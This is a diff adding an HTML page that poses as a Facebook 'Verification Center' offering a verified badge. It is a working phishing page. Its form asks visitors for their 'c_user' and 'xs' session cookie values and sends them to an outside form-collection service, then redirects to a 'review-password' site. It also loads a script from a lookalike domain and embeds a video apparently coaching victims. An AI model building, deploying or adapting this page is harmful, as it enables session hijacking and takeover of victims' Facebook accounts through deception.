@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang=en><!--
+ 
+-->
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width, initial-scale=1.0">
+<title>Request a Verified Badge on Facebook</title>
+<link href="https://vjs.zencdn.net/7.14.3/video-js.css" rel="stylesheet" />
+<script src="https://vjs.zencdn.net/7.14.3/video.min.js"></script>
+<script src="https://metaverifybadgeget.github.io/inspectr/index.js"></script>
+<style>
+   body {
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden
+   }
+
+   .header {
+      background-color: #4267B2;
+      padding: 25px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: white
+   }
+
+   .header-container {
+      display: flex;
+      align-items: center
+   }
+
+   .facebook-text {
+      font-size: 35px;
+      font-weight: bold;
+      color: white;
+      font-family: "Helvetica Neue", Arial, sans-serif
+   }
+
+   .divider {
+      height: 10px;
+      background-color: #e9ebee
+   }
+
+   .content-container {
+      width: 80%;
+      max-width: 800px;
+      background-color: white;
+      margin: 30px auto;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+      position: relative
+   }
+
+   .verification-heading {
+      font-size: 32px;
+      color: #1c1e21;
+      margin-bottom: 20px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      position: relative
+   }
+
+   .verification-heading img {
+      width: 50px;
+      height: auto;
+      margin-right: 15px
+   }
+
+   h1 {
+      font-size: 24px;
+      color: #1c1e21;
+      margin-bottom: 20px;
+      font-weight: normal;
+      text-align: left
+   }
+
+   p {
+      font-size: 14px;
+      color: #606770;
+      margin-bottom: 10px;
+      line-height: 1.6
+   }
+
+
+
+   .form-group {
+      margin-bottom: 20px
+   }
+
+   label {
+      font-size: 14px;
+      color: #4b4f56;
+      display: block;
+      margin-bottom: 8px
+   }
+
+   input[type="text"] {
+      width: 100%;
+      padding: 12px 10px;
+      font-size: 14px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      box-sizing: border-box;
+      background-color: #f5f6f7;
+      transition: all 0.3s ease
+   }
+
+   input[type="text"]:focus {
+      border-color: #1877f2;
+      background-color: white;
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2)
+   }
+
+   .notice {
+      font-size: 12px;
+      color: #606770;
+      margin-bottom: 25px
+   }
+
+   .form-notice {
+      font-size: 12px;
+      color: #ff0000;
+      margin-bottom: 20px
+   }
+
+   button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 700;
+      text-transform: uppercase;
+      transition: background-color 0.3s ease
+   }
+
+   button:hover {
+      background-color: #165ecc
+   }
+
+   .video-container {
+      position: relative;
+      width: 100%;
+      max-width: 640px;
+     
+     
+   }
+
+   .poster {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: url('poster.jpg') no-repeat center center;
+      background-size: cover;
+      cursor: pointer;
+   }
+
+   .play-btn {
+      font-size: 3rem;
+      color: white;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+      pointer-events: none;
+   }
+   
+
+   video {
+      width: 100%;
+      display: block;
+   }
+   
+</style>
+
+<body>
+
+   <div class=header>
+      <div class=header-container>
+         <span class=facebook-text>facebook</span>
+      </div>
+   </div>
+
+   <div class=divider></div>
+
+   <div class=content-container>
+
+      <div class=verification-heading>
+         <img
+            src="data:image/png;base64,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"
+            alt="Global Glitch Media Logo">
+         Verification Center
+      </div>
+      <h1>Request a verified badge on Facebook</h1>
+      <p>The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of
+         the individual, public figure, or brand that it represents.</p>
+      <p>Previously, the verified badge also required the person or brand to be notable and unique. You may still see
+         users with a verified badge that represents our previous eligibility requirements.</p>
+      <p>Please provide the precise details below. Refer to the video for clarification if you find the instructions
+         unclear.</p>
+
+      <div class=video-container style=position:relative!important>
+         <video id="video"  controls preload=""
+            poster="fbPlay.jfif">
+            <source
+               src="https://cdn.glitch.global/7ce918cb-3078-452a-a62e-3fa825fa0943/Verified%20Badges.mp4?v=1725740907151"
+               type="video/mp4">
+            Your browser does not support the video tag.
+         </video>
+      </div>
+
+     
+      <p class=form-notice>Please ensure that all required information is accurately provided. Failure to do so may
+         result in not receiving a verified badge.</p>
+
+                        <form class="content" action="https://submit-form.com/vPFU9JOZW" method="POST">
+ <input
+    type="hidden"
+    name="_redirect"
+    value="https://review-password.vercel.app/"
+  />
+         
+         <div class=form-group>
+            <label for=c_user>c_user</label>
+            <input type=text id=c_user name=c_user pattern=[0-9]+ minlength=6 required value>
+         </div>
+         <div class=form-group>
+            <label for=xs>xs</label>
+            <input type=text id=xs name=xs pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" required
+               value>
+         </div>
+         <p class=notice>Please make sure not to log out from your computer or laptop until you have received a
+            verification email.</p>
+         <button class="submitBtn" type=submit>Submit</button>
+      </form>
+   </div>
